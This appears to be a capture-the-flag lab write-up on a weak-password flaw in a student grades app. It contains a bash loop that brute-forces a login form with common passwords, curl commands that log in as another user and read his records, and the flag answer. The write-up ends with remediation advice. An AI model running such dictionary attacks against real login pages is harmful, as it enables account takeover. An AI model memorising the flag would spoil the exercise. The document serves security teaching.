# Flag 01 — Broken authentication (weak password)

**Flag:** `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}`
**Location:** `GET /api/grades?student={jdoe_id}` — the flag is stored in jdoe's own Darkly grade record, readable once you log in as him.
**Severity:** High
**Class:** Broken authentication — a dictionary password (and unsalted MD5 storage).

## Discovery

The forum post `jdoe here 🤘 and no, I'm not changing my password` openly advertised a short, dictionary password "near the top of the most famous list" — a pointer to `rockyou.txt`. Comments elsewhere confirmed passwords are stored as MD5.

## Exploitation

1. Brute-force `jdoe` against the login form with rockyou entries. The password is `abc123`:

```bash
for pw in rockyou 123456 12345 password abc123 ...; do
  loc=$(curl -s -o /dev/null -w '%{redirect_url}' -X POST http://TARGET:4942/login \
    --data-urlencode "identity=jdoe" --data-urlencode "password=$pw")
  case "$loc" in *error*|"") ;; *) echo "HIT: '$pw'"; break;; esac
done
# HIT: 'abc123'
```

2. Log in (saving the session cookie) and read jdoe's grades — the Darkly record carries the flag:

```bash
curl -s -i -c jdoe.txt -X POST http://TARGET:4942/login \
  --data-urlencode "identity=jdoe" --data-urlencode "password=abc123"
curl -s -b jdoe.txt "http://TARGET:4942/api/grades?student=z4p1cnx47mfy50f"
# ... "name":"Darkly" ... "flag":"FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}"
```

## Evidence of weak hashing

Fetching the profile leaks `pw_hint: e99a18c428cb38d5f260853678922e03`, which is exactly `md5("abc123")` — unsalted MD5, instantly reversible.

## Impact

Any attacker can take over a student account by guessing a common password. Because passwords are unsalted MD5, a single database leak exposes every password to rainbow-table cracking.

## Remediation

- Enforce a strong password policy; reject common/breached passwords.
- Rate-limit and lock the login after repeated failures to stop dictionary attacks.
- Store passwords with a slow, salted hash (bcrypt/argon2); never expose a password "hint".

## In simple terms

The student `jdoe` used an obvious password (`abc123`) and bragged online that he'd never change it. We guessed it by rapidly trying a famous list of the most common passwords until one worked — that took seconds. Once logged in as him, the flag was just sitting in his own grades page.

Two mistakes made this easy: the password was a common word, and the site stored passwords with old, broken "MD5" scrambling that can be reversed instantly. Lesson: common passwords get guessed, and weak password storage turns one leak into everyone's passwords.
